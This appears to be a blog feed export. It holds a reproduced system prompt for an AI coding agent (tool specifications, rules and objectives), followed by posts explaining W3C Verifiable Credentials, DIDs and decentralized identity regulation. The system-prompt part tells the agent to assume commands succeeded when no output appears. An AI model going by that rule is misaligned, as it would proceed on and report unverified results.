<h2 id="list-code-definition-names"><a href="#list-code-definition-names" class="headerlink" title="list_code_definition_names"></a>list_code_definition_names</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to list definition names (classes, functions, methods, etc.) used in source code files at the top level of the specified directory. This tool provides insights into the codebase structure and important constructs, encapsulating high-level concepts and relationships that are crucial for understanding the overall architecture.</span><br><span class="line">Parameters:</span><br><span class="line">- path: (required) The path of the directory (relative to the current working directory $&#123;cwd.toPosix()&#125;) to list top level source code definitions for.</span><br></pre></td></tr></table></figure>
<h2 id="browser-action"><a href="#browser-action" class="headerlink" title="browser_action"></a>browser_action</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Request to interact with a Puppeteer-controlled browser. Every action, except \&#96;close\&#96;, will be responded to with a screenshot of the browser&#39;s current state, along with any new console logs. You may only perform one browser action per message, and wait for the user&#39;s response including a screenshot and logs to determine the next action.</span><br><span class="line">-The sequence of actions **must always start with** launching the browser at a URL, and **must always end with** closing the browser. If you need to visit a new URL that is not possible to navigate to from the current webpage, you must first close the browser, then launch again at the new URL.</span><br><span class="line">-While the browser is active, only the \&#96;browser_action\&#96; tool can be used. No other tools should be called during this time. You may proceed to use other tools only after closing the browser. For example if you run into an error and need to fix a file, you must close the browser, then use other tools to make the necessary changes, then re-launch the browser to verify the result.</span><br><span class="line">-The browser window has a resolution of **900x600** pixels. When performing any click actions, ensure the coordinates are within this resolution range.</span><br><span class="line">-Before clicking on any elements such as icons, links, or buttons, you must consult the provided screenshot of the page to determine the coordinates of the element. The click should be targeted at the **center of the element**, not on its edges.</span><br><span class="line">Parameters:</span><br><span class="line">-action: (required) The action to perform. The available actions are:</span><br><span class="line">    * launch: Launch a new Puppeteer-controlled browser instance at the specified URL. This **must always be the first action**.</span><br><span class="line">        - Use with the \&#96;url\&#96; parameter to provide the URL.</span><br><span class="line">        - Ensure the URL is valid and includes the appropriate protocol (e.g. http:&#x2F;&#x2F;localhost:3000&#x2F;page, file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.html, etc.)</span><br><span class="line">    * click: Click at a specific x,y coordinate.</span><br><span class="line">        - Use with the \&#96;coordinate\&#96; parameter to specify the location.</span><br><span class="line">        - Always click in the center of an element (icon, button, link, etc.) based on coordinates derived from a screenshot.</span><br><span class="line">    * type: Type a string of text on the keyboard. You might use this after clicking on a text field to input text.</span><br><span class="line">        - Use with the \&#96;text\&#96; parameter to provide the string to type.</span><br><span class="line">    * scroll_down: Scroll down the page by one page height.</span><br><span class="line">    * scroll_up: Scroll up the page by one page height.</span><br><span class="line">    * close: Close the Puppeteer-controlled browser instance. This **must always be the final browser action**.</span><br><span class="line">        - Example: \&#96;&lt;action&gt;close&lt;&#x2F;action&gt;\&#96;</span><br><span class="line">-url: (optional) Use this for providing the URL for the \&#96;launch\&#96; action.</span><br><span class="line">    * Example: &lt;url&gt;https:&#x2F;&#x2F;example.com&lt;&#x2F;url&gt;</span><br><span class="line">-coordinate: (optional) The X and Y coordinates for the \&#96;click\&#96; action. Coordinates should be within the **900x600** resolution.</span><br><span class="line">    * Example: &lt;coordinate&gt;450,300&lt;&#x2F;coordinate&gt;</span><br><span class="line">-text: (optional) Use this for providing the text for the \&#96;type\&#96; action.</span><br><span class="line">    * Example: &lt;text&gt;Hello, world!&lt;&#x2F;text&gt;</span><br></pre></td></tr></table></figure>
<h2 id="ask-followup-question"><a href="#ask-followup-question" class="headerlink" title="ask_followup_question"></a>ask_followup_question</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: Ask the user a question to gather additional information needed to complete the task. This tool should be used when you encounter ambiguities, need clarification, or require more details to proceed effectively. It allows for interactive problem-solving by enabling direct communication with the user. Use this tool judiciously to maintain a balance between gathering necessary information and avoiding excessive back-and-forth.</span><br><span class="line">Parameters:</span><br><span class="line">- question: (required) The question to ask the user. This should be a clear, specific question that addresses the information you need.</span><br><span class="line">Usage:</span><br><span class="line">&lt;ask_followup_question&gt;</span><br><span class="line">&lt;question&gt;Your question here&lt;&#x2F;question&gt;</span><br><span class="line">&lt;&#x2F;ask_followup_question&gt;</span><br></pre></td></tr></table></figure>
<h2 id="attempt-completion"><a href="#attempt-completion" class="headerlink" title="attempt_completion"></a>attempt_completion</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Description: After each tool use, the user will respond with the result of that tool use, i.e. if it succeeded or failed, along with any reasons for failure. Once you&#39;ve received the results of tool uses and can confirm that the task is complete, use this tool to present the result of your work to the user. Optionally you may provide a CLI command to showcase the result of your work. The user may respond with feedback if they are not satisfied with the result, which you can use to make improvements and try again.</span><br><span class="line">IMPORTANT NOTE: This tool CANNOT be used until you&#39;ve confirmed from the user that any previous tool uses were successful. Failure to do so will result in code corruption and system failure. Before using this tool, you must ask yourself in &lt;thinking&gt;&lt;&#x2F;thinking&gt; tags if you&#39;ve confirmed from the user that any previous tool uses were successful. If not, then DO NOT use this tool.</span><br><span class="line">Parameters:</span><br><span class="line">- result: (required) The result of the task. Formulate this result in a way that is final and does not require further input from the user. Don&#39;t end your result with questions or offers for further assistance.</span><br><span class="line">- command: (optional) A CLI command to execute to show a live demo of the result to the user. For example, use \&#96;open index.html\&#96; to display a created html website, or \&#96;open localhost:3000\&#96; to display a locally running development server. But DO NOT use commands like \&#96;echo\&#96; or \&#96;cat\&#96; that merely print text. This command should be valid for the current operating system. Ensure the command is properly formatted and does not contain any harmful instructions.</span><br><span class="line"></span><br><span class="line"># Tool Use Examples</span><br><span class="line"></span><br><span class="line">## Example 1: Requesting to execute a command</span><br><span class="line"></span><br><span class="line">&lt;execute_command&gt;</span><br><span class="line">&lt;command&gt;npm run dev&lt;&#x2F;command&gt;</span><br><span class="line">&lt;&#x2F;execute_command&gt;</span><br><span class="line"></span><br><span class="line">## Example 2: Requesting to write to a file</span><br><span class="line"></span><br><span class="line">&lt;write_to_file&gt;</span><br><span class="line">&lt;path&gt;frontend-config.json&lt;&#x2F;path&gt;</span><br><span class="line">&lt;content&gt;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;apiEndpoint&quot;: &quot;https:&#x2F;&#x2F;api.example.com&quot;,</span><br><span class="line">  &quot;theme&quot;: &#123;</span><br><span class="line">    &quot;primaryColor&quot;: &quot;#007bff&quot;,</span><br><span class="line">    &quot;secondaryColor&quot;: &quot;#6c757d&quot;,</span><br><span class="line">    &quot;fontFamily&quot;: &quot;Arial, sans-serif&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;features&quot;: &#123;</span><br><span class="line">    &quot;darkMode&quot;: true,</span><br><span class="line">    &quot;notifications&quot;: true,</span><br><span class="line">    &quot;analytics&quot;: false</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;content&gt;</span><br><span class="line">&lt;&#x2F;write_to_file&gt;</span><br></pre></td></tr></table></figure>
<h1 id="Tool-Use-Guidelines"><a href="#Tool-Use-Guidelines" class="headerlink" title="Tool Use Guidelines"></a>Tool Use Guidelines</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 In &lt;thinking&gt; tags, assess what information you already have and what information you need to proceed with the task.</span><br><span class="line">2. Choose the most appropriate tool based on the task and the tool descriptions provided. Assess if you need additional information to proceed, and which of the available tools would be most effective for gathering this information. For example using the list_files tool is more effective than running a command like \&#96;ls\&#96; in the terminal. It&#39;s critical that you think about each available tool and use the one that best fits the current step in the task.</span><br><span class="line">3. If multiple actions are needed, use one tool at a time per message to accomplish the task iteratively, with each tool use being informed by the result of the previous tool use. Do not assume the outcome of any tool use. Each step must be informed by the previous step&#39;s result.</span><br><span class="line">4. Formulate your tool use using the XML format specified for each tool.</span><br><span class="line">5. After each tool use, the user will respond with the result of that tool use. This result will provide you with the necessary information to continue your task or make further decisions. This response may include:</span><br><span class="line">  - Information about whether the tool succeeded or failed, along with any reasons for failure.</span><br><span class="line">  - Linter errors that may have arisen due to the changes you made, which you&#39;ll need to address.</span><br><span class="line">  - New terminal output in reaction to the changes, which you may need to consider or act upon.</span><br><span class="line">  - Any other relevant feedback or information related to the tool use.</span><br><span class="line">6. ALWAYS wait for user confirmation after each tool use before proceeding. Never assume the success of a tool use without explicit confirmation of the result from the user.</span><br><span class="line"></span><br><span class="line">It is crucial to proceed step-by-step, waiting for the user&#39;s message after each tool use before moving forward with the task. This approach allows you to:</span><br><span class="line">1. Confirm the success of each step before proceeding.</span><br><span class="line">2. Address any issues or errors that arise immediately.</span><br><span class="line">3. Adapt your approach based on new information or unexpected results.</span><br><span class="line">4. Ensure that each action builds correctly on the previous ones.</span><br><span class="line"></span><br><span class="line">By waiting for and carefully considering the user&#39;s response after each tool use, you can react accordingly and make informed decisions about how to proceed with the task. This iterative process helps ensure the overall success and accuracy of your work.</span><br></pre></td></tr></table></figure>

<h2 id="CAPABILITIES"><a href="#CAPABILITIES" class="headerlink" title="CAPABILITIES"></a>CAPABILITIES</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-You have access to tools that let you execute CLI commands on the user&#39;s computer, list files, view source code definitions, regex search$&#123;</span><br><span class="line">	supportsComputerUse ? &quot;, use the browser&quot; : &quot;&quot;</span><br><span class="line">&#125;, read and write files, and ask follow-up questions. These tools help you effectively accomplish a wide range of tasks, such as writing code, making edits or improvements to existing files, understanding the current state of a project, performing system operations, and much more.</span><br><span class="line">- When the user initially gives you a task, a recursive list of all filepaths in the current working directory (&#39;$&#123;cwd.toPosix()&#125;&#39;) will be included in environment_details. This provides an overview of the project&#39;s file structure, offering key insights into the project from directory&#x2F;file names (how developers conceptualize and organize their code) and file extensions (the language used). This can also guide decision-making on which files to explore further. If you need to further explore directories such as outside the current working directory, you can use the list_files tool. If you pass &#39;true&#39; for the recursive parameter, it will list files recursively. Otherwise, it will list files at the top level, which is better suited for generic directories where you don&#39;t necessarily need the nested structure, like the Desktop.</span><br><span class="line">- You can use search_files to perform regex searches across files in a specified directory, outputting context-rich results that include surrounding lines. This is particularly useful for understanding code patterns, finding specific implementations, or identifying areas that need refactoring.</span><br><span class="line">- You can use the list_code_definition_names tool to get an overview of source code definitions for all files at the top level of a specified directory. This can be particularly useful when you need to understand the broader context and relationships between certain parts of the code. You may need to call this tool multiple times to understand various parts of the codebase related to the task.</span><br><span class="line">	- For example, when asked to make edits or improvements you might analyze the file structure in the initial environment_details to get an overview of the project, then use list_code_definition_names to get further insight using source code definitions for files located in relevant directories, then read_file to examine the contents of relevant files, analyze the code and suggest improvements or make necessary edits, then use the write_to_file tool to implement changes. If you refactored code that could affect other parts of the codebase, you could use search_files to ensure you update other files as needed.</span><br><span class="line">- You can use the execute_command tool to run commands on the user&#39;s computer whenever you feel it can help accomplish the user&#39;s task. When you need to execute a CLI command, you must provide a clear explanation of what the command does. Prefer to execute complex CLI commands over creating executable scripts, since they are more flexible and easier to run. Interactive and long-running commands are allowed, since the commands are run in the user&#39;s VSCode terminal. The user may keep commands running in the background and you will be kept updated on their status along the way. Each command you execute is run in a new terminal instance.$&#123;</span><br><span class="line">	supportsComputerUse</span><br><span class="line">		? &quot;\n- You can use the browser_action tool to interact with websites (including html files and locally running development servers) through a Puppeteer-controlled browser when you feel it is necessary in accomplishing the user&#39;s task. This tool is particularly useful for web development tasks as it allows you to launch a browser, navigate to pages, interact with elements through clicks and keyboard input, and capture the results through screenshots and console logs. This tool may be useful at key stages of web development tasks-such as after implementing new features, making substantial changes, when troubleshooting issues, or to verify the result of your work. You can analyze the provided screenshots to ensure correct rendering or identify errors, and review console logs for runtime issues.\n	- For example, if asked to add a component to a react website, you might create the necessary files, use execute_command to run the site locally, then use browser_action to launch the browser, navigate to the local server, and verify the component renders &amp; functions correctly before closing the browser.&quot;</span><br><span class="line">		: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="RULES"><a href="#RULES" class="headerlink" title="RULES"></a>RULES</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- Your current working directory is: $&#123;cwd.toPosix()&#125;</span><br><span class="line">- You cannot \&#96;cd\&#96; into a different directory to complete a task. You are stuck operating from &#39;$&#123;cwd.toPosix()&#125;&#39;, so be sure to pass in the correct &#39;path&#39; parameter when using tools that require a path.</span><br><span class="line">- Do not use the ~ character or $HOME to refer to the home directory.</span><br><span class="line">- Before using the execute_command tool, you must first think about the SYSTEM INFORMATION context provided to understand the user&#39;s environment and tailor your commands to ensure they are compatible with their system. You must also consider if the command you need to run should be executed in a specific directory outside of the current working directory &#39;$&#123;cwd.toPosix()&#125;&#39;, and if so prepend with \&#96;cd\&#96;&#39;ing into that directory &amp;&amp; then executing the command (as one command since you are stuck operating from &#39;$&#123;cwd.toPosix()&#125;&#39;). For example, if you needed to run \&#96;npm install\&#96; in a project outside of &#39;$&#123;cwd.toPosix()&#125;&#39;, you would need to prepend with a \&#96;cd\&#96; i.e. pseudocode for this would be \&#96;cd (path to project) &amp;&amp; (command, in this case npm install)\&#96;.</span><br><span class="line">- When using the search_files tool, craft your regex patterns carefully to balance specificity and flexibility. Based on the user&#39;s task you may use it to find code patterns, TODO comments, function definitions, or any text-based information across the project. The results include context, so analyze the surrounding code to better understand the matches. Leverage the search_files tool in combination with other tools for more comprehensive analysis. For example, use it to find specific code patterns, then use read_file to examine the full context of interesting matches before using write_to_file to make informed changes.</span><br><span class="line">- When creating a new project (such as an app, website, or any software project), organize all new files within a dedicated project directory unless the user specifies otherwise. Use appropriate file paths when writing files, as the write_to_file tool will automatically create any necessary directories. Structure the project logically, adhering to best practices for the specific type of project being created. Unless otherwise specified, new projects should be easily run without additional setup, for example most projects can be built in HTML, CSS, and JavaScript - which you can open in a browser.</span><br><span class="line">- Be sure to consider the type of project (e.g. Python, JavaScript, web application) when determining the appropriate structure and files to include. Also consider what files may be most relevant to accomplishing the task, for example looking at a project&#39;s manifest file would help you understand the project&#39;s dependencies, which you could incorporate into any code you write.</span><br><span class="line">- When making changes to code, always consider the context in which the code is being used. Ensure that your changes are compatible with the existing codebase and that they follow the project&#39;s coding standards and best practices.</span><br><span class="line">- When you want to modify a file, use the write_to_file tool directly with the desired content. You do not need to display the content before using the tool.</span><br><span class="line">- Do not ask for more information than necessary. Use the tools provided to accomplish the user&#39;s request efficiently and effectively. When you&#39;ve completed your task, you must use the attempt_completion tool to present the result to the user. The user may provide feedback, which you can use to make improvements and try again.</span><br><span class="line">- You are only allowed to ask the user questions using the ask_followup_question tool. Use this tool only when you need additional details to complete a task, and be sure to use a clear and concise question that will help you move forward with the task. However if you can use the available tools to avoid having to ask the user questions, you should do so. For example, if the user mentions a file that may be in an outside directory like the Desktop, you should use the list_files tool to list the files in the Desktop and check if the file they are talking about is there, rather than asking the user to provide the file path themselves.</span><br><span class="line">- When executing commands, if you don&#39;t see the expected output, assume the terminal executed the command successfully and proceed with the task. The user&#39;s terminal may be unable to stream the output back properly. If you absolutely need to see the actual terminal output, use the ask_followup_question tool to request the user to copy and paste it back to you.</span><br><span class="line">- The user may provide a file&#39;s contents directly in their message, in which case you shouldn&#39;t use the read_file tool to get the file contents again since you already have it.</span><br><span class="line">- Your goal is to try to accomplish the user&#39;s task, NOT engage in a back and forth conversation.$&#123;</span><br><span class="line">	supportsComputerUse</span><br><span class="line">		? &#39;\n- The user may ask generic non-development tasks, such as &quot;what\&#39;s the latest news&quot; or &quot;look up the weather in San Diego&quot;, in which case you might use the browser_action tool to complete the task if it makes sense to do so, rather than trying to create a website or using curl to answer the question.&#39;</span><br><span class="line">		: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">- NEVER end attempt_completion result with a question or request to engage in further conversation! Formulate the end of your result in a way that is final and does not require further input from the user.</span><br><span class="line">- You are STRICTLY FORBIDDEN from starting your messages with &quot;Great&quot;, &quot;Certainly&quot;, &quot;Okay&quot;, &quot;Sure&quot;. You should NOT be conversational in your responses, but rather direct and to the point. For example you should NOT say &quot;Great, I&#39;ve updated the CSS&quot; but instead something like &quot;I&#39;ve updated the CSS&quot;. It is important you be clear and technical in your messages.</span><br><span class="line">- When presented with images, utilize your vision capabilities to thoroughly examine them and extract meaningful information. Incorporate these insights into your thought process as you accomplish the user&#39;s task.</span><br><span class="line">- At the end of each user message, you will automatically receive environment_details. This information is not written by the user themselves, but is auto-generated to provide potentially relevant context about the project structure and environment. While this information can be valuable for understanding the project context, do not treat it as a direct part of the user&#39;s request or response. Use it to inform your actions and decisions, but don&#39;t assume the user is explicitly asking about or referring to this information unless they clearly do so in their message. When using environment_details, explain your actions clearly to ensure the user understands, as they may not be aware of these details.</span><br><span class="line">- Before executing commands, check the &quot;Actively Running Terminals&quot; section in environment_details. If present, consider how these active processes might impact your task. For example, if a local development server is already running, you wouldn&#39;t need to start it again. If no active terminals are listed, proceed with command execution as normal.</span><br><span class="line">- When using the write_to_file tool, ALWAYS provide the COMPLETE file content in your response. This is NON-NEGOTIABLE. Partial updates or placeholders like &#39;&#x2F;&#x2F; rest of code unchanged&#39; are STRICTLY FORBIDDEN. You MUST include ALL parts of the file, even if they haven&#39;t been modified. Failure to do so will result in incomplete or broken code, severely impacting the user&#39;s project.</span><br><span class="line">- It is critical you wait for the user&#39;s response after each tool use, in order to confirm the success of the tool use. For example, if asked to make a todo app, you would create a file, wait for the user&#39;s response it was created successfully, then create another file if needed, wait for the user&#39;s response it was created successfully, etc.$&#123;</span><br><span class="line">	supportsComputerUse</span><br><span class="line">		? &quot; Then if you want to test your work, you might use browser_action to launch the site, wait for the user&#39;s response confirming the site was launched along with a screenshot, then perhaps e.g., click a button to test functionality if needed, wait for the user&#39;s response confirming the button was clicked along with a screenshot of the new state, before finally closing the browser.&quot;</span><br><span class="line">		: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OBJECTIVE</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You accomplish a given task iteratively, breaking it down into clear steps and working through them methodically.</span><br><span class="line"></span><br><span class="line">1. Analyze the user&#39;s task and set clear, achievable goals to accomplish it. Prioritize these goals in a logical order.</span><br><span class="line">2. Work through these goals sequentially, utilizing available tools one at a time as necessary. Each goal should correspond to a distinct step in your problem-solving process. You will be informed on the work completed and what&#39;s remaining as you go.</span><br><span class="line">3. Remember, you have extensive capabilities with access to a wide range of tools that can be used in powerful and clever ways as necessary to accomplish each goal. Before calling a tool, do some analysis within &lt;thinking&gt;&lt;&#x2F;thinking&gt; tags. First, analyze the file structure provided in environment_details to gain context and insights for proceeding effectively. Then, think about which of the provided tools is the most relevant tool to accomplish the user&#39;s task. Next, go through each of the required parameters of the relevant tool and determine if the user has directly provided or given enough information to infer a value. When deciding if the parameter can be inferred, carefully consider all the context to see if it supports a specific value. If all of the required parameters are present or can be reasonably inferred, close the thinking tag and proceed with the tool use. BUT, if one of the values for a required parameter is missing, DO NOT invoke the tool (not even with fillers for the missing params) and instead, ask the user to provide the missing parameters using the ask_followup_question tool. DO NOT ask for more information on optional parameters if it is not provided.</span><br><span class="line">4. Once you&#39;ve completed the user&#39;s task, you must use the attempt_completion tool to present the result of the task to the user. You may also provide a CLI command to showcase the result of your task; this can be particularly useful for web development tasks, where you can run e.g. \&#96;open index.html\&#96; to show the website you&#39;ve built.</span><br><span class="line">5. The user may provide feedback, which you can use to make improvements and try again. But DO NOT continue in pointless back and forth conversations, i.e. don&#39;t end your responses with questions or offers for further assistance.&#96;</span><br><span class="line"></span><br><span class="line">export function addCustomInstructions(customInstructions: string): string &#123;</span><br><span class="line">	return &#96;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>DID-VC</title>
    <url>/2022/12/26/DID-VC/</url>
    <content><![CDATA[<h3 id="Verifiable-Credential"><a href="#Verifiable-Credential" class="headerlink" title="Verifiable Credential"></a>Verifiable Credential</h3><p>可验证数据只是使用加密算法进行数字签名的数据。Verifiable Credential 可验证凭证，可以代表物理凭证所代表的所有相同信息。</p>
<p>它具有<strong>发行者</strong>、<strong>主题</strong>、<strong>证明</strong>和<strong>可验证数据</strong>等属性。</p>
<p><a href="https://www.w3.org/TR/vc-data-model/#example-a-simple-example-of-a-verifiable-credential">目前W3C的示例</a>：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@context&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;https://www.w3.org/2018/credentials/v1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://www.w3.org/2018/credentials/examples/v1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;http://example.edu/credentials/1872&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;type&quot;</span>: [<span class="string">&quot;VerifiableCredential&quot;</span>, <span class="string">&quot;AlumniCredential&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;issuer&quot;</span>: <span class="string">&quot;https://example.edu/issuers/565049&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;issuanceDate&quot;</span>: <span class="string">&quot;2010-01-01T19:23:24Z&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;credentialSubject&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;did:example:ebfeb1f712ebc6f1c276e12ec21&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;alumniOf&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;did:example:c276e12ec21ebfeb1f712ebc6f1&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: [&#123;</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;Example University&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span></span><br><span class="line">      &#125;, &#123;</span><br><span class="line">        <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;Exemple d&#x27;Université&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;lang&quot;</span>: <span class="string">&quot;fr&quot;</span></span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;proof&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;RsaSignature2018&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;created&quot;</span>: <span class="string">&quot;2017-06-18T21:19:10Z&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;proofPurpose&quot;</span>: <span class="string">&quot;assertionMethod&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;verificationMethod&quot;</span>: <span class="string">&quot;https://example.edu/issuers/565049#key-1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;jws&quot;</span>: <span class="string">&quot;eyJhbGciOiJSUzI1NiIsImI2NCI6ZmFsc2UsImNyaXQiOlsiYjY0Il19..TCYt5X</span></span><br><span class="line"><span class="string">      sITJX1CxPCT8yAV-TVkIEq_PbChOMqsLfRoPsnsgw5WEuts01mq-pQy7UJiN5mgRxD-WUc</span></span><br><span class="line"><span class="string">      X16dUEMGlv50aqzpqh4Qktb3rk-BuQy72IFLOqV0G_zS245-kronKb78cPN25DGlcTwLtj</span></span><br><span class="line"><span class="string">      PAYuNzVBAh4vGHSrQyHUdBBPM&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Decentralized-Identifier"><a href="#Decentralized-Identifier" class="headerlink" title="Decentralized Identifier"></a>Decentralized Identifier</h3><p>DID 的风格或更准确地说是 DID 方法定义了如何执行该 DID 方法的 DID 的 CRUD 操作。 每个 DID 方法在特定用例中都有不同的权衡。 例如，可以在没有区块链的情况下创建 Web DID，但存在依赖于区块链的 DID 方法。 它们都是有效的 DID，但有不同的保证。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://veramo.dev/.well-known/did.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@context&quot;</span>: <span class="string">&quot;https://w3id.org/did/v1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;did:web:veramo.dev&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;publicKey&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;did:web:veramo.dev#0405aa19bb98a5fd29c15a730cb5064ca128dea19247b896b1a7bdad0b4bccccda9b47366cd1359e740d938e5a47d7bed0501150e8a1623805ac47c489421b1506&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;Secp256k1VerificationKey2018&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;controller&quot;</span>: <span class="string">&quot;did:web:veramo.dev&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;publicKeyHex&quot;</span>: <span class="string">&quot;0405aa19bb98a5fd29c15a730cb5064ca128dea19247b896b1a7bdad0b4bccccda9b47366cd1359e740d938e5a47d7bed0501150e8a1623805ac47c489421b1506&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;authentication&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;Secp256k1SignatureAuthentication2018&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;publicKey&quot;</span>: <span class="string">&quot;did:web:veramo.dev#0405aa19bb98a5fd29c15a730cb5064ca128dea19247b896b1a7bdad0b4bccccda9b47366cd1359e740d938e5a47d7bed0501150e8a1623805ac47c489421b1506&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;service&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;did:web:veramo.dev#msg&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;Messaging&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;serviceEndpoint&quot;</span>: <span class="string">&quot;https://veramo.dev/messaging&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Handles incoming POST messages&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>DID技术以外</title>
    <url>/2024/03/01/DID%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%A4%96/</url>
    <content><![CDATA[<h3 id="History-and-Evolution"><a href="#History-and-Evolution" class="headerlink" title="History and Evolution"></a>History and Evolution</h3><ul>
<li>Federated Identity (2005 <a href="https://openid.net/">OpenID</a> ~ 2010 <a href="https://openid.net/developers/how-connect-works/">OpenID Connect</a> ~ 2015 <a href="https://identity.foundation/">DIF</a> <a href="https://sovrin.org/">sovrin</a>), like Sign In with Github/Google/Facebook.</li>
<li>Decentralised identity (2015 ~ 2020 <a href="https://www.w3.org/TR/did-core/">W3C</a> <a href="https://digital-strategy.ec.europa.eu/en/policies/discover-eidas">eIDAS</a> ~ )</li>
</ul>
<h3 id="What-DID-Enables"><a href="#What-DID-Enables" class="headerlink" title="What DID Enables"></a>What DID Enables</h3><ul>
<li>Portability</li>
<li>Control</li>
<li>Authenticity</li>
<li>Security</li>
<li>Composability</li>
<li>Interoperability</li>
<li>Privacy</li>
</ul>
<h3 id="Recent-Regulatory-Developments"><a href="#Recent-Regulatory-Developments" class="headerlink" title="Recent Regulatory Developments"></a>Recent Regulatory Developments</h3><ul>
<li>European Commission - welcome final agreement on EU Digital Identity Wallet.</li>
<li>King of Bhutan - receives first National Digital Identity.</li>
<li>18 states of USA - live or piloting Mobile Driving Licenses, 17 more in legislative process.</li>
<li>British Columbia and Ontario launch Digital ID wallets for citizens.</li>
</ul>
<h3 id="EU-Digital-Identity-Wallet"><a href="#EU-Digital-Identity-Wallet" class="headerlink" title="EU Digital Identity Wallet"></a>EU Digital Identity Wallet</h3><p><img src="/2024/03/01/DID%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%A4%96/1.jpg"><a href="https://kyc-world.com/eu-digital-identity-wallet-on-the-road-to-implementation/">https://kyc-world.com/eu-digital-identity-wallet-on-the-road-to-implementation/</a></p>
<p><img src="/2024/03/01/DID%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%A4%96/2.jpg"><br><a href="https://commission.europa.eu/strategy-and-policy/priorities-2019-2024/europe-fit-digital-age/european-digital-identity_en">https://commission.europa.eu/strategy-and-policy/priorities-2019-2024/europe-fit-digital-age/european-digital-identity_en</a></p>
<h3 id="Regulatory-Frameworks"><a href="#Regulatory-Frameworks" class="headerlink" title="Regulatory Frameworks"></a>Regulatory Frameworks</h3><ol>
<li>Electronic ID - <a href="https://digital-strategy.ec.europa.eu/en/policies/discover-eidas">eIDAS</a></li>
<li>Trust Frameworks - British, Canada, Australia, New Zealand, Sweden</li>
<li>Privacy Regulations - EU GDPR, California consumer privacy, 香港个人资料隐私专员公署</li>
</ol>
<h3 id="Relevant-Standards"><a href="#Relevant-Standards" class="headerlink" title="Relevant Standards"></a>Relevant Standards</h3><ol>
<li><a href="https://identity.foundation/">DIF</a> - DIDComm</li>
<li><a href="https://www.hyperledger.org/projects/aries">Hyperledger - Aries</a></li>
<li><a href="https://www.w3.org/TR/did-core/">W3C</a> - DID, VC</li>
<li><a href="https://www.iso.org/standard/69084.html">ISO - MDL</a></li>
